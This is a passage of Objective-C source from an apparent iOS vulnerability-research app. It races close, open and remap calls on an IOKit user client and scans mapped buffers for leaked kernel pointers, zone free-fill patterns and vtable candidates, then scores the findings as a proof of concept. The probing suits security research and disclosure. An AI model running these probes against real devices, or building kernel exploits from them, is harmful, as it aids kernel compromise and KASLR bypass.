                @"  capture[%d]: kr=0x%x size=%u(%@) type=0x%02x(%@) kernPtrs=%u (buf=%lu struct=%lu)",
                i, kr, eventSize, sizeOk ? @"ok" : @"ANOMALY",
                eventType, typeOk ? @"ok" : @"ANOMALY", localKernPtrs,
                (unsigned long)bufferLeaks.count, (unsigned long)structLeaks.count]];

            // Log any struct output leaks in detail
            if (structLeaks.count > 0) {
                [self appendLog:@"    *** KERNEL POINTER PATTERNS IN STRUCT OUTPUT:"];
                for (NSDictionary *leak in structLeaks) {
                    [self appendLog:[NSString stringWithFormat:@"      offset=0x%@ value=%@",
                                     leak[@"offset"], leak[@"value"]]];
                }
            }
        }
    }

    [self appendLog:[NSString stringWithFormat:@"Post-stress capture summary: anomalies=%u newKernPtrs=%u",
                     captureAnomalies, newKernPtrs]];

    if (captureAnomalies > 0 || newKernPtrs > 0) {
        [self appendLog:@"  *** SIGNAL: Post-stress captures show anomalies (size/type/pointer-like patterns). ***"];
    } else if (diffCount > 0) {
        [self appendLog:@"  INFO: Mapped buffer contents changed across phases (common for live event buffers)."];
    } else {
        [self appendLog:@"  No structural anomalies detected."];
    }

    [self appendLog:@"====== Sub-phase C Complete ======"];
}

#pragma mark - Sub-phase D: Post-Lifecycle Mapped Buffer Fingerprint

- (void)runPostLifecycleFingerprint:(io_connect_t)connection
                         mappedAddr:(mach_vm_address_t)mappedAddr
                         mappedSize:(mach_vm_size_t)mappedSize
                        preEntropy:(double)preEntropy
                           preHash:(uint64_t)preHash
                   primaryScanCount:(int)primaryScanCount
                   primaryLeakCount:(int)primaryLeakCount {
    [self appendLog:@"\n====== Sub-phase D: Post-Lifecycle Buffer Fingerprint ======"];

    int finalPrimaryScanCount = primaryScanCount;
    int finalPrimaryLeakCount = primaryLeakCount;

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Compute post-stress hash of first 64 bytes (XOR-fold)
    size_t hashLen = MIN((size_t)64, totalSize);
    uint64_t postHash = 0;
    for (size_t i = 0; i < hashLen; i++) {
        postHash ^= ((uint64_t)base[i]) << ((i % 8) * 8);
    }

    BOOL hashChanged = (preHash != postHash);
    [self appendLog:[NSString stringWithFormat:@"Buffer fingerprint: preHash=0x%016llx postHash=0x%016llx %@",
                     preHash, postHash, hashChanged ? @"CHANGED" : @"unchanged"]];

    if (hashChanged) {
        [self appendLog:[NSString stringWithFormat:@"  Post-stress first 32 bytes: %@",
                         [self hexPreview:base length:MIN((size_t)32, hashLen)]]];
    }

    // Aggressive scan for kernel pointer-like values
    [self appendLog:@"\n--- Final Aggressive Kernel Pointer Scan ---"];
    NSArray<NSDictionary *> *finalPointers = [self scanForKernelPointers:base
                                                                  length:totalSize
                                                              maxResults:100
                                                               connIndex:0];

    uint32_t kernPtrCount = (uint32_t)finalPointers.count;

    if (kernPtrCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** LIFECYCLE BOUNDARY ANOMALY: Mapped region contains %u kernel address pattern(s) post-stress. ***",
            kernPtrCount]];

        // Log first 10 detailed findings
        NSUInteger detailCount = MIN(10, finalPointers.count);
        for (NSUInteger i = 0; i < detailCount; i++) {
            NSDictionary *ptr = finalPointers[i];
            BOOL inArray = [ptr[@"inArray"] boolValue];
            [self appendLog:[NSString stringWithFormat:
                @"  [%lu] +0x%@ = %@ %@",
                (unsigned long)i,
                ptr[@"offset"],
                ptr[@"value"],
                inArray ? @"(in pointer array)" : @""]];
        }

        if (kernPtrCount > 10) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %u more kernel address patterns", kernPtrCount - 10]];
        }

        // Look for vtable-like structures (multiple consecutive pointers)
        int consecutiveCount = 0;
        size_t lastOffset = 0;
        for (NSDictionary *ptr in finalPointers) {
            size_t offset = [ptr[@"offset"] unsignedLongValue];
            if (offset == lastOffset + 8) {
                consecutiveCount++;
                if (consecutiveCount == 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  *** VTABLE CANDIDATE: Found 3+ consecutive kernel pointers starting at +0x%zx ***",
                        offset - 16]];
                }
            } else {
                consecutiveCount = 0;
            }
            lastOffset = offset;
        }
    } else {
        [self appendLog:@"  No kernel address patterns detected in final scan."];
    }

    // Compute and compare entropy
    double postEntropy = [self shannonEntropyForBytes:base length:totalSize];
    double entropyDelta = postEntropy - preEntropy;

    [self appendLog:[NSString stringWithFormat:@"Entropy: pre=%.4f post=%.4f delta=%+.4f",
                     preEntropy, postEntropy, entropyDelta]];

    if (fabs(entropyDelta) > 0.5) {
        [self appendLog:@"  SIGNAL: Significant entropy change — possible allocation reuse pattern."];
    }

    // Final summary
    [self appendLog:@"\n--- Lifecycle Boundary Test Summary ---"];
    [self appendLog:[NSString stringWithFormat:@"Hash changed: %@", hashChanged ? @"YES" : @"NO"]];
    [self appendLog:[NSString stringWithFormat:@"Kernel address patterns found: %u", kernPtrCount]];
    [self appendLog:[NSString stringWithFormat:@"Entropy delta: %+.4f", entropyDelta]];
    [self appendLog:[NSString stringWithFormat:
                     @"Cross-client events: %d/%d checks",
                     self.proofCrossClientEvents, self.proofCrossClientChecks]];
    [self appendLog:[NSString stringWithFormat:
                     @"Termination overlap: %d probes, %d opener cycles",
                     self.proofTerminationProbes, self.proofTerminationOpenCycles]];

    self.proofHashChanged = hashChanged;
    self.proofKernelPointerPatterns = (kernPtrCount > 0);
    self.proofEntropyDelta = entropyDelta;

    NSInteger proofScore = 0;
    NSString *proofReason = @"No actionable cross-client evidence.";
    if (self.proofCrossClientSignal) {
        proofScore += 50;
    }
    if (self.proofKernelPointerLeak) {
        proofScore += 20;
    }
    if (kernPtrCount > 0) {
        proofScore += 30;
    }
    if (finalPrimaryLeakCount > 0) {
        // Detected during live race scanning - very strong signal
        proofScore += 40;
    }
    if (self.proofReadAfterCloseLeaks > 0) {
        proofScore += 35;  // Read-after-close exposed kernel data
    }
    if (self.proofUninitLeaks > 0) {
        proofScore += 30;  // Uninitialized buffer contained kernel ptrs
    }
    if (self.proofRemapAfterFreeLeaks > 0) {
        proofScore += 35;  // Remap-after-free exposed kernel data
    }
    if (self.proofZoneFreePatternHits > 0) {
        proofScore += 25;  // Zone free-patterns suggest stale references observable from userspace
    }
    if (self.proofTermRaceActive) {
        proofScore += 25;
    }
    if (self.proofHashChanged) {
        proofScore += 15;
    }
    if (fabs(entropyDelta) > 0.3) {
        proofScore += 15;
    }
    if (proofScore > 100) proofScore = 100;

    if (proofScore >= 70) {
        proofReason = @"High confidence lifecycle boundary bug signal (cross-client data misdirection + overlapping termination activity).";
    } else if (proofScore >= 45) {
        proofReason = @"Moderate confidence: some lifecycle boundary signals present; reproduce with multiple iterations.";
    } else if (proofScore >= 30) {
        proofReason = @"Low-to-moderate confidence: isolated signal(s), add run loops for stronger statistical confidence.";
    }

    [self appendLog:[NSString stringWithFormat:@"PoC Confidence Score: %ld/100", (long)proofScore]];
    [self appendLog:[NSString stringWithFormat:@"PoC Verdict: %@", proofReason]];

    if (self.proofCrossClientSignal && self.proofFirstCrossClientConn >= 0) {
        NSString *proofHex = self.proofFirstCrossClientHex ?: @"<none>";
        [self appendLog:[NSString stringWithFormat:
            @"PoC Witness: first misdirected aux buffer conn=%d eventSize=%u hex=%@",
            self.proofFirstCrossClientConn, self.proofFirstCrossClientEventSize, proofHex]];
    }

    if (self.proofKernelPointerLeak) {
        [self appendLog:[NSString stringWithFormat:
            @"*** PoC Pointer Signal: conn=%d offset=0x%x value=0x%016llx (%@) ***",
            self.proofKernelPointerSourceConn,
            self.proofKernelPointerOffset,
            self.proofKernelPointerValue,
            self.proofKernelPointerHex ?: @"<none>"]];
    }

    if (finalPrimaryLeakCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** FINDING: Detected %d kernel pointer exposures during live race scanning ***",
            finalPrimaryLeakCount]];
        [self appendLog:@"  This indicates kernel addresses are observable in userspace-mapped buffers"];
        [self appendLog:@"  during lifecycle race conditions — a memory boundary inconsistency requiring hardening."];
    }

    // Report advanced probe results
    if (self.proofReadAfterCloseLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** READ-AFTER-CLOSE: %d kernel pointer patterns found during close teardown window ***",
            self.proofReadAfterCloseLeaks]];
    }
    if (self.proofUninitLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** UNINIT BUFFER: %d kernel pointer patterns found in fresh buffers ***",
            self.proofUninitLeaks]];
    }
    if (self.proofRemapAfterFreeLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** POST-CLOSE REMAP: %d kernel pointer patterns found via stale buffer remap ***",
            self.proofRemapAfterFreeLeaks]];
    }
    if (self.proofZoneFreePatternHits > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** ZONE FREE-PATTERN: %d stale-reference signatures (0xDEADBEEF etc.) visible from userspace ***",
            self.proofZoneFreePatternHits]];
    }

    if (kernPtrCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"CONCLUSION: %u kernel pointer patterns observed in mapped buffer post-stress.", kernPtrCount]];
        [self appendLog:@"  Combined with cross-client/termination signals, this strongly indicates"];
        [self appendLog:@"  observable kernel memory boundary inconsistency via lifecycle race conditions."];
    } else if (fabs(entropyDelta) > 0.3) {
        [self appendLog:@"CONCLUSION: Significant entropy drift detected post-stress; treat as possible allocation/state reuse."
                     "\n  Pair with cross-client / termination-race signals above for confidence."];
    } else if (hashChanged) {
        [self appendLog:@"CONCLUSION: Fingerprint changed post-stress without pointer-like values."
                     "\n  This is consistent with state drift and should be interpreted with other lifecycle signals."];
    } else {
        // Hash/entropy changes alone are not a strong signal: many event buffers legitimately vary
        // across time and across calls as new events are produced.
        [self appendLog:@"CONCLUSION: No strong anomalies detected in this run (no pointer-like patterns or major drift)."];
    }

    NSDateFormatter *isoFormatter = [[NSDateFormatter alloc] init];
    isoFormatter.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    isoFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    isoFormatter.dateFormat = @"yyyy-MM-dd'T'HH:mm:ss.SSS'Z'";
    NSString *artifactTimestamp = [isoFormatter stringFromDate:[NSDate date]];

    NSDictionary *artifact = @{
        @"test": @"lifecycle-boundary-v2",
        @"timestampUtc": artifactTimestamp ?: @"<invalid>",
        @"bundleId": NSBundle.mainBundle.bundleIdentifier ?: @"<nil>",
        @"deviceModel": UIDevice.currentDevice.model ?: @"<nil>",
        @"osVersion": UIDevice.currentDevice.systemVersion ?: @"<nil>",
        @"result": @{
                @"proofScore": @(proofScore),
                @"reason": proofReason ?: @"<nil>",
                @"conclusion": self.proofKernelPointerLeak ? @"kernel_pointer_exposure_detected"
                                                        : (proofScore >= 70 ? @"high_confidence"
                                                                            : @"needs_more_evidence"),
                @"hashChanged": @(hashChanged),
                @"kernelPtrPatterns": @(kernPtrCount),
                @"entropyDelta": @(entropyDelta),
                @"preHash": [NSString stringWithFormat:@"0x%016llx", preHash],
                @"postHash": [NSString stringWithFormat:@"0x%016llx", postHash]
        },
        @"crossClient": @{
                @"events": @(self.proofCrossClientEvents),
                @"checks": @(self.proofCrossClientChecks),
                @"firstConn": @(self.proofFirstCrossClientConn),
                @"firstEventSize": @(self.proofFirstCrossClientEventSize),
                @"firstHex": self.proofFirstCrossClientHex ?: @"<none>"
        },
        @"terminationRace": @{
                @"probes": @(self.proofTerminationProbes),
                @"openerCycles": @(self.proofTerminationOpenCycles),
                @"active": @(self.proofTermRaceActive)
        },
        @"liveRaceScanning": @{
                @"totalScans": @(finalPrimaryScanCount),
                @"leaksDetected": @(finalPrimaryLeakCount),
                @"leakRate": finalPrimaryScanCount > 0 ? @((double)finalPrimaryLeakCount / (double)finalPrimaryScanCount) : @(0.0)
        },
        @"leakCandidate": self.proofKernelPointerLeak ? @{
                @"value": [NSString stringWithFormat:@"0x%016llx", self.proofKernelPointerValue],
                @"offset": @(self.proofKernelPointerOffset),
                @"sourceConn": @(self.proofKernelPointerSourceConn),
                @"raw": self.proofKernelPointerHex ?: @"<none>"
        } : @{},
        @"advancedProbes": @{
                @"readAfterCloseLeaks": @(self.proofReadAfterCloseLeaks),
                @"uninitBufferLeaks": @(self.proofUninitLeaks),
                @"remapAfterFreeLeaks": @(self.proofRemapAfterFreeLeaks),
                @"zoneFreePatternHits": @(self.proofZoneFreePatternHits)
        }
    };

    [self appendPocArtifactEntry:artifact];
    if (self.proofArtifactPath) {
        [self appendLog:[NSString stringWithFormat:@"Proof artifact path: %@", self.proofArtifactPath]];
    }

    [self appendLog:@"====== Sub-phase D Complete ======"];
}

#pragma mark - Sub-phase E: Zone Free-Pattern / Stale Reference Detection

- (BOOL)isZoneFreePattern:(uint64_t)value {
    if (value == 0) return NO;
    uint32_t lo32 = (uint32_t)(value & 0xFFFFFFFF);
    uint32_t hi32 = (uint32_t)(value >> 32);

    // XNU kalloc zone free-fill patterns
    if (lo32 == 0xDEADBEEF || hi32 == 0xDEADBEEF) return YES;
    if (lo32 == 0xDEADDEAD || hi32 == 0xDEADDEAD) return YES;
    if (lo32 == 0xBAADF00D || hi32 == 0xBAADF00D) return YES;
    if (lo32 == 0xABABABAB || hi32 == 0xABABABAB) return YES;

    // XNU zone_poisoned_cookie / kasan free-fill patterns
    if (value == 0xDEADC0DEDEADC0DEULL) return YES;
    if (value == 0xFEEDFACEFEEDFACEULL) return YES;
    if (value == 0xDEADBEEFDEADBEEFULL) return YES;
    if (value == 0xBBBADF00BBBADF00ULL) return YES;

    // MTE tag patterns (arm64e): tagged pointers with high nibble tags
    // After free, MTE-tagged pointers have invalid tags
    if ((value >> 56) != 0 && (value >> 56) != 0xFF) {
        uint64_t untagged = value & 0x00FFFFFFFFFFFFFFULL;
        if (untagged >= 0x00FFFFFE00000000ULL && untagged <= 0x00FFFFFFFFFFFFFFULL) {
            return YES;  // MTE-tagged kernel pointer with wrong tag = stale reference indicator
        }
    }

    // Repeated byte patterns (zone fill)
    uint8_t b0 = (uint8_t)(value & 0xFF);
    BOOL allSame = YES;
    for (int i = 1; i < 8; i++) {
        if (((uint8_t)(value >> (i * 8)) & 0xFF) != b0) {
            allSame = NO;
            break;
        }
    }
    if (allSame && b0 != 0x00 && b0 != 0xFF) return YES;

    return NO;
}

- (int)scanForZoneFreePatterns:(const uint8_t *)base length:(size_t)length {
    int count = 0;
    for (size_t off = 0; off + 8 <= length; off += 4) {
        uint64_t val = 0;
        memcpy(&val, base + off, sizeof(val));
        if ([self isZoneFreePattern:val]) {
            count++;
            if (count <= 5) {
                [self appendLog:[NSString stringWithFormat:
                    @"    ZONE FREE-PATTERN at +0x%zx: 0x%016llx", off, val]];
            }
        }
    }
    return count;
}

#pragma mark - Sub-phase E1: Read-After-Close Race

- (void)runReadAfterCloseProbe:(io_connect_t *)connections
                         count:(int)connCount
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   raceService:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E1: Read-After-Close Memory Boundary Probe ======"];
    [self appendLog:@"  Strategy: Close conn → immediately scan mapped buffer for residual kernel-space patterns"];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t scanSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Snapshot before we start
    uint8_t *preCloseSnap = (uint8_t *)malloc(scanSize);
    if (!preCloseSnap) {
        [self appendLog:@"  SKIP: allocation failed"];
        return;
    }
    memcpy(preCloseSnap, base, scanSize);

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalNewBytes = 0;
    static const int kReadAfterCloseIterations = 500;

    for (int iter = 0; iter < kReadAfterCloseIterations; iter++) {
        // Close conn[0] — this triggers closeForClient which tears down the ClientObject
        uint64_t closeScalar = 0;
        kern_return_t ckr = sIOConnectCallMethod(connections[0], kSelectorClose,
                             &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);

        // IMMEDIATELY scan the mapped buffer — the kernel may not have finished cleanup
        // Look for kernel pointers that briefly appear during teardown
        NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:base
                                                              length:scanSize
                                                          maxResults:20
                                                           connIndex:0];

        // Also scan for zone free-patterns (stale reference indicators)
        int freePatternHits = [self scanForZoneFreePatterns:base length:scanSize];

        // Check for byte-level changes from our snapshot
        int changedBytes = 0;
        for (size_t i = 0; i < scanSize; i++) {
            if (base[i] != preCloseSnap[i]) changedBytes++;
        }

        if (leaks.count > 0 || freePatternHits > 0 || (changedBytes > 0 && iter < 5)) {
            [self appendLog:[NSString stringWithFormat:
                @"  [iter %d] close=0x%x kernPtrs=%lu freePatterns=%d changed=%d bytes",
                iter, ckr, (unsigned long)leaks.count, freePatternHits, changedBytes]];

            for (NSDictionary *leak in leaks) {
                [self appendLog:[NSString stringWithFormat:
                    @"    *** KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                    leak[@"offset"], leak[@"value"]]];
            }
        }

        totalLeaks += (int)leaks.count;
        totalFreePatterns += freePatternHits;
        totalNewBytes += (changedBytes > 0) ? 1 : 0;

        // Update snapshot
        memcpy(preCloseSnap, base, scanSize);

        // Also try reading via copyEvent struct output right after close
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[512];
        size_t structOutSize = sizeof(structOut);
        kern_return_t copyKr = sIOConnectCallMethod(connections[0], kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);

        // Scan the struct output for kernel pointers
        if (copyKr == KERN_SUCCESS && structOutSize > 0) {
            NSArray<NSDictionary *> *structLeaks = [self scanForKernelPointers:structOut
                                                                        length:structOutSize
                                                                    maxResults:10
                                                                     connIndex:-1];
            if (structLeaks.count > 0) {
                [self appendLog:[NSString stringWithFormat:
                    @"    *** STRUCT OUTPUT FINDING (post-close): %lu kernel pointer patterns ***",
                    (unsigned long)structLeaks.count]];
                for (NSDictionary *leak in structLeaks) {
                    [self appendLog:[NSString stringWithFormat:
                        @"      offset=0x%@ value=%@", leak[@"offset"], leak[@"value"]]];
                }
                totalLeaks += (int)structLeaks.count;
            }
        }

        // Re-open so we can close again next iteration
        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        sIOConnectCallMethod(connections[0], kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
    }

    free(preCloseSnap);

    self.proofReadAfterCloseLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Read-after-close summary: %d iterations, %d kernel ptrs, %d free-patterns, %d buffer-change events",
        kReadAfterCloseIterations, totalLeaks, totalFreePatterns, totalNewBytes]];

    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found during close teardown window ***"];
    }
    if (totalFreePatterns > 0) {
        [self appendLog:@"  *** FINDING: Zone free-patterns detected in mapped buffer (stale reference indicator) ***"];
    }

    [self appendLog:@"====== Sub-phase E1 Complete ======"];
}

#pragma mark - Sub-phase E2: Uninitialized Buffer Probe

- (void)runUninitBufferProbe:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E2: Uninitialized Buffer Probe ======"];
    [self appendLog:@"  Strategy: Open fresh connection → map buffer → verify zeroed state before any copyEvent"];

    if (raceService == MACH_PORT_NULL) {
        [self appendLog:@"  SKIP: no service port"];
        return;
    }

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalNonZero = 0;
    static const int kUninitProbeIterations = 200;

    for (int iter = 0; iter < kUninitProbeIterations; iter++) {
        // Open a fresh connection
        io_connect_t freshConn = MACH_PORT_NULL;
        kern_return_t okr = sIOServiceOpen(raceService, mach_task_self_, 2, &freshConn);
        if (okr != KERN_SUCCESS || freshConn == MACH_PORT_NULL) continue;

        // Gate it (open via selector 0)
        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gkr = sIOConnectCallMethod(freshConn, kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
        if (gkr != KERN_SUCCESS) {
            sIOServiceClose(freshConn);
            mach_port_deallocate(mach_task_self(), freshConn);
            continue;
        }

        // Map the shared buffer — BEFORE any copyEvent call
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mkr = KERN_FAILURE;
        if (sIOConnectMapMemory64) {
            mkr = sIOConnectMapMemory64(freshConn, kMemoryTypeEventBuffer,
                                         mach_task_self_, &mapAddr, &mapSize, 1);
        }

        if (mkr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0) {
            const uint8_t *freshBase = (const uint8_t *)(uintptr_t)mapAddr;
            size_t freshSize = MIN((size_t)mapSize, (size_t)kMappedProbeMaxBytes);

            // Check if the buffer is non-zero BEFORE any event read
            BOOL isAllZero = [self isZeroFilled:freshBase length:freshSize];

            if (!isAllZero) {
                totalNonZero++;

                // Scan for kernel pointers in the uninitialized buffer
                NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:freshBase
                                                                      length:freshSize
                                                                  maxResults:20
                                                                   connIndex:-2];

                int freePatternHits = [self scanForZoneFreePatterns:freshBase length:freshSize];

                if (leaks.count > 0 || freePatternHits > 0 || totalNonZero <= 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  [iter %d] NON-ZERO pre-event buffer! kernPtrs=%lu freePatterns=%d size=%zu",
                        iter, (unsigned long)leaks.count, freePatternHits, freshSize]];

                    // Show first 64 bytes of the uninit buffer
                    [self appendLog:[NSString stringWithFormat:@"    hex: %@",
                        [self hexPreview:freshBase length:MIN(freshSize, (size_t)64)]]];

                    for (NSDictionary *leak in leaks) {
                        [self appendLog:[NSString stringWithFormat:
                            @"    *** UNINIT KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                            leak[@"offset"], leak[@"value"]]];
                    }
                }

                totalLeaks += (int)leaks.count;
                totalFreePatterns += freePatternHits;
            }

            // Unmap
            if (sIOConnectUnmapMemory64) {
                sIOConnectUnmapMemory64(freshConn, kMemoryTypeEventBuffer, mach_task_self_, mapAddr);
            } else {
                vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
            }
        }

        // Close and release
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(freshConn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
        sIOServiceClose(freshConn);
        mach_port_deallocate(mach_task_self(), freshConn);
    }

    self.proofUninitLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Uninit buffer summary: %d iterations, %d non-zero buffers, %d kernel ptrs, %d free-patterns",
        kUninitProbeIterations, totalNonZero, totalLeaks, totalFreePatterns]];

    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found in uninitialized mapped buffers ***"];
    }
    if (totalNonZero > 0 && totalLeaks == 0) {
        [self appendLog:@"  INFO: Non-zero residual data found but no kernel address patterns."];
        [self appendLog:@"    May contain heap metadata or stale event data from prior allocation."];
    }

    [self appendLog:@"====== Sub-phase E2 Complete ======"];
}

#pragma mark - Sub-phase E3: Post-Close Remap Boundary Probe

- (void)runRemapAfterFreeProbe:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E3: Post-Close Remap Boundary Probe ======"];
    [self appendLog:@"  Strategy: Open→map→close→remap on stale conn to test boundary enforcement on freed buffer backing"];

    if (raceService == MACH_PORT_NULL) {
        [self appendLog:@"  SKIP: no service port"];
        return;
    }

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalRemapSuccess = 0;
    int totalStaleReads = 0;
    static const int kRemapIterations = 200;

    for (int iter = 0; iter < kRemapIterations; iter++) {
        // Open a fresh connection and gate it
        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t okr = sIOServiceOpen(raceService, mach_task_self_, 2, &conn);
        if (okr != KERN_SUCCESS || conn == MACH_PORT_NULL) continue;

        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gkr = sIOConnectCallMethod(conn, kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
        if (gkr != KERN_SUCCESS) {
            sIOServiceClose(conn);
            mach_port_deallocate(mach_task_self(), conn);
            continue;
        }

        // Map the buffer (populate it)
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mkr = KERN_FAILURE;
        if (sIOConnectMapMemory64) {
            mkr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
                                         mach_task_self_, &mapAddr, &mapSize, 1);
        }

        if (mkr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
            uint64_t closeScalar = 0;
            sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(conn);
            mach_port_deallocate(mach_task_self(), conn);
            continue;
        }

        // Do a copyEvent to populate the buffer with known-good data
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[64];
        size_t structOutSize = sizeof(structOut);
        sIOConnectCallMethod(conn, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);

        // Snapshot the buffer content before close
        size_t scanSize = MIN((size_t)mapSize, (size_t)kMappedProbeMaxBytes);
        uint8_t *preCloseSnap = (uint8_t *)malloc(scanSize);
        if (preCloseSnap) {
            memcpy(preCloseSnap, (const void *)(uintptr_t)mapAddr, scanSize);
        }

        // CLOSE the connection's internal state (sel 1) — releases ClientObject
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);

        // The mapped region might still be valid in our address space even though
        // the kernel-side object was freed. Read it immediately.
        const uint8_t *staleBase = (const uint8_t *)(uintptr_t)mapAddr;

        // Check if the buffer changed after close (indicates kernel wrote during teardown)
        BOOL changed = NO;
        if (preCloseSnap) {
            changed = (memcmp(staleBase, preCloseSnap, scanSize) != 0);
        }

        if (changed) {
            totalStaleReads++;

            NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:staleBase
                                                                  length:scanSize
                                                              maxResults:20
                                                               connIndex:-3];

            int freePatternHits = [self scanForZoneFreePatterns:staleBase length:scanSize];

            if (leaks.count > 0 || freePatternHits > 0 || totalStaleReads <= 3) {
                [self appendLog:[NSString stringWithFormat:
                    @"  [iter %d] BUFFER CHANGED AFTER CLOSE! kernPtrs=%lu freePatterns=%d",
                    iter, (unsigned long)leaks.count, freePatternHits]];

                // Show what changed
                if (preCloseSnap) {
                    int diffCount = 0;
                    for (size_t i = 0; i < MIN(scanSize, (size_t)64); i++) {
                        if (staleBase[i] != preCloseSnap[i]) diffCount++;
                    }
                    [self appendLog:[NSString stringWithFormat:@"    %d bytes differ in first 64",
                                     diffCount]];
                    [self appendLog:[NSString stringWithFormat:@"    post-close hex: %@",
                        [self hexPreview:staleBase length:MIN(scanSize, (size_t)64)]]];
                }

                for (NSDictionary *leak in leaks) {
                    [self appendLog:[NSString stringWithFormat:
                        @"    *** POST-CLOSE REMAP KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                        leak[@"offset"], leak[@"value"]]];
                }
            }

            totalLeaks += (int)leaks.count;
            totalFreePatterns += freePatternHits;
        }

        // Try to remap on the same (now closed-internally) connection
        mach_vm_address_t remapAddr = 0;
        mach_vm_size_t remapSize = 0;
        if (sIOConnectMapMemory64) {
            kern_return_t remapKr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
                                                           mach_task_self_, &remapAddr, &remapSize, 1);
            if (remapKr == KERN_SUCCESS && remapAddr != 0 && remapSize > 0) {
                totalRemapSuccess++;

                const uint8_t *remapBase = (const uint8_t *)(uintptr_t)remapAddr;
                size_t remapScan = MIN((size_t)remapSize, (size_t)kMappedProbeMaxBytes);

                NSArray<NSDictionary *> *remapLeaks = [self scanForKernelPointers:remapBase
                                                                           length:remapScan
                                                                       maxResults:20
                                                                        connIndex:-4];

                int remapFreePatterns = [self scanForZoneFreePatterns:remapBase length:remapScan];

                if (remapLeaks.count > 0 || remapFreePatterns > 0 || totalRemapSuccess <= 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  [iter %d] REMAP SUCCEEDED on closed conn! kernPtrs=%lu freePatterns=%d",
                        iter, (unsigned long)remapLeaks.count, remapFreePatterns]];
                    [self appendLog:[NSString stringWithFormat:@"    remap hex: %@",
                        [self hexPreview:remapBase length:MIN(remapScan, (size_t)64)]]];
                }

                totalLeaks += (int)remapLeaks.count;
                totalFreePatterns += remapFreePatterns;

                // Clean up remap
                if (sIOConnectUnmapMemory64) {
                    sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self_, remapAddr);
                } else {
                    vm_deallocate(mach_task_self(), (vm_address_t)remapAddr, (vm_size_t)remapSize);
                }
            }
        }

        if (preCloseSnap) free(preCloseSnap);

        // Clean up original mapping and connection
        if (sIOConnectUnmapMemory64) {
            sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self_, mapAddr);
        } else {
            vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
        }
        sIOServiceClose(conn);
        mach_port_deallocate(mach_task_self(), conn);
    }

    self.proofRemapAfterFreeLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Post-close remap summary: %d iterations, %d stale reads, %d remaps ok, %d kernel ptrs, %d free-patterns",
        kRemapIterations, totalStaleReads, totalRemapSuccess, totalLeaks, totalFreePatterns]];

